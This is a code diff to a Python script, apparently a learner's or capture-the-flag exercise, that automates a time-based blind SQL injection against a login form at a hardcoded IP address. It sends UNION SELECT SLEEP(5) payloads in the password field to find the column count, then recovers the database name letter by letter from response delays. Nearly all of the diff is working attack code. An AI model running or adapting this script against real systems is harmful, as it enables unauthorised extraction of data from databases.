@@ -8,23 +8,32 @@ def db_name():
     texte = ""
     TIME = 5
     url = "http://51.15.136.118/pageid.php"
-    passwd_type = "' UNION SELECT SLEEP(5) where database() like '" + texte + dictionary[j] + "%' -- "
+    passwd_type = ""
+    global table
+    table = ""
 
-
+    for letter in dictionary:
+        for num in range(1, 10):
+            usr = "idc"
+            nums = ",{}".format(",".join([str(i) for i in range(1, num + 1)]))
+            passwd_type = "' UNION SELECT SLEEP(5)" + nums + "" + " where database() like '" + letter + "%' -- "
+            start_time = time.time()
+            response = requests.post(url, data={'username': usr, 'password': passwd_type})
+            end_time = time.time()
+            total_time = end_time - start_time
+            if total_time >= TIME:
+                table = nums
+                break
+        if total_time >= TIME:
+            break
+ 
+ 
+    print(table)
 
     for i in range(1, 20):
-        for j in range(0, len(dictionary)):
-            for k in range(1, 10):
-
-                passwd_type += "' UNION SELECT SLEEP(5)" + str(k) + "" + "," + " where database() like '" + texte + dictionary[j] + "%' -- "
-                print(passwd_type)
-
-
-            
-            
+        for j in range(0, len(dictionary)):         
             usr = "idc"
-            """faire la meme chose avec les ,1,2 qui change en fonction du nombre de tables"""
-            passwd = "' UNION SELECT SLEEP(5),1,2 where database() like '" + texte + dictionary[j] + "%' -- "
+            passwd = "' UNION SELECT SLEEP(5)" + table + " where database() like '" + texte + dictionary[j] + "%' -- "
             print(passwd)
 
 
@@ -51,3 +60,5 @@ def db_name():
 
     db.append(texte)
     print(db)
+
+db_name()
